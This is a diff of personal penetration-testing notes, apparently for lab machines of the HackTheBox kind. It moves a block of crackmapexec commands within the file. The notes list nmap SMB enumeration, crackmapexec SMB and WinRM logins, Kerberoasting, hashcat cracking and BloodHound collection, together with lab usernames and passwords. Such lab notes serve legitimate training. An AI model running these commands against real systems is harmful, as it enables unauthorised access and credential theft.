@@ -1,6 +1,14 @@
+# Linux machine
+
 ```bash
 # nmap
 nmap 10.10.10.175 --script=smb-enum* -p445
+
+#crackmapexec(smb/winrm)
+crackmapexec smb 10.10.10.175 -u "" -p "" -d Egotistical-bank.local
+crackmapexec smb 10.10.10.175 -u "fsmith" -p "" -d Egotistical-bank.local
+crackmapexec smb 10.10.10.175 -u "fsmith" -p "Thestrokes23" -d Egotistical-bank.local
+crackmapexec winrm 10.10.10.175 -u 'fsmith' -p 'Thestrokes23' -d Egotistical-bank.local
 
 
 # smbclient
@@ -64,11 +72,7 @@ GetUserSPNs.py -request -dc-ip 10.129.193.5 active.htb/svc_tgs
 hashcat -m 18200 ./hash.txt /usr/share/wordlists/rockyou.txt -o cracked.txt
 
 
-#crackmapexec(smb/winrm)
-crackmapexec smb 10.10.10.175 -u "" -p "" -d Egotistical-bank.local
-crackmapexec smb 10.10.10.175 -u "fsmith" -p "" -d Egotistical-bank.local
-crackmapexec smb 10.10.10.175 -u "fsmith" -p "Thestrokes23" -d Egotistical-bank.local
-crackmapexec winrm 10.10.10.175 -u 'fsmith' -p 'Thestrokes23' -d Egotistical-bank.local
+
 
 # bloodhound
 bloodhound-python --dns-tcp -ns 10.129.193.5 -d active.htb -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18'
